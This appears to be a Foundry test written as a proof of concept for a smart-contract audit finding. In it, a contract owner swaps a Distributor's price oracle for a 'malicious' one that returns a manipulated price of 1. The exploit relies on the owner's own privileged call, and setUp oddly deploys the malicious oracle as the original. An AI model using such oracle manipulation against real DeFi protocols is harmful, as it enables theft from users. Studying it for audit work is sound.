// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IChainLinkDataConsumer {
    function getPrice(address token) external view returns (uint256);
}

contract MaliciousChainLinkDataConsumer is IChainLinkDataConsumer {
    function getPrice(address token) external pure override returns (uint256) {
        // Return a manipulated price
        return 1; // Extremely low price for manipulation
    }
}

contract Distributor {
    address public owner;
    IChainLinkDataConsumer public chainLinkDataConsumer;
    mapping(address => uint256) public tokenPrices;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(address _chainLinkDataConsumer) {
        owner = msg.sender;
        chainLinkDataConsumer = IChainLinkDataConsumer(_chainLinkDataConsumer);
    }

    function setChainLinkDataConsumer(address _chainLinkDataConsumer) external onlyOwner {
        chainLinkDataConsumer = IChainLinkDataConsumer(_chainLinkDataConsumer);
    }

    function updateDepositTokensPrices(address[] calldata tokens) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            tokenPrices[tokens[i]] = chainLinkDataConsumer.getPrice(tokens[i]);
        }
    }
}

contract ExploitTest is Test {
    Distributor distributor;
    MaliciousChainLinkDataConsumer maliciousConsumer;
    address owner = address(0x1);
    address token = address(0x2);

    function setUp() public {
        // Deploy the original ChainLink Data Consumer (mocked)
        IChainLinkDataConsumer originalConsumer = IChainLinkDataConsumer(address(new MaliciousChainLinkDataConsumer()));
        
        // Deploy the Distributor contract
        vm.prank(owner);
        distributor = new Distributor(address(originalConsumer));

        // Deploy the malicious ChainLink Data Consumer
        maliciousConsumer = new MaliciousChainLinkDataConsumer();
    }

    function test_exploit() public {
        // Step 1: Owner sets the malicious ChainLink Data Consumer
        vm.prank(owner);
        distributor.setChainLinkDataConsumer(address(maliciousConsumer));

        // Step 2: Update deposit token prices with manipulated data
        address[] memory tokens = new address[](1);
        tokens[0] = token;
        distributor.updateDepositTokensPrices(tokens);

        // Step 3: Assert that the token price has been manipulated
        uint256 manipulatedPrice = distributor.tokenPrices(token);
        assertEq(manipulatedPrice, 1, "Token price should be manipulated to 1");
    }
}